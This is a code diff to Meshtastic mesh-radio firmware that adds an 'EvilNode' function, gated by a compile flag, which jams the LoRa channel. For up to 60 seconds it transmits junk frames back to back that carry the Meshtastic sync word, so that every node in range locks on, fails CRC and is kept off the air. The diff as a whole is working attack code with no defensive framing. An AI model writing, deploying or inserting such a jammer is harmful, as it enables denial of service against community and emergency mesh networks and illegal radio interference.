@@ -564,3 +564,39 @@ bool RadioLibInterface::startSend(meshtastic_MeshPacket *txp)
         return res == RADIOLIB_ERR_NONE;
     }
 }
+
+#ifdef EVIL_SYNCWORD_JAM
+void RadioLibInterface::evilSyncWordJam(uint32_t durationMs)
+{
+    if (durationMs == 0)
+        durationMs = 5000;
+    if (durationMs < 100)
+        durationMs = 100;
+    if (durationMs > 60000)
+        durationMs = 60000;
+
+    LOG_WARN("EvilNode: sync-word jam START (%u ms) on sync word 0x2b", durationMs);
+
+    // Take the radio out of the normal interrupt-driven RX/TX state machine and
+    // enable the transmit path (RF switch / PA), matching the normal Tx setup.
+    setStandby();            // quiesces: standby, disableInterrupt, completeSending
+    configHardwareForSend(); // setTransmitEnable(true) on boards that need it
+
+    // Fixed garbage payload. Every frame still carries the LoRa preamble and the
+    // Meshtastic sync word, so any node in range locks on, waits, fails CRC, and
+    // is held off-channel for the burst.
+    uint8_t garbage[32];
+    memset(garbage, 0xA5, sizeof(garbage));
+
+    uint32_t start = millis();
+    uint32_t bursts = 0;
+    while (millis() - start < durationMs) {
+        iface->transmit(garbage, sizeof(garbage)); // blocking raw Tx on 0x2b
+        bursts++;
+        yield(); // feed the watchdog and let other tasks breathe between frames
+    }
+
+    LOG_WARN("EvilNode: sync-word jam DONE (%u bursts), restoring receive", bursts);
+    startReceive(); // full RX restore (standby + startReceiveDutyCycleAuto + enableInterrupt)
+}
+#endif // EVIL_SYNCWORD_JAM
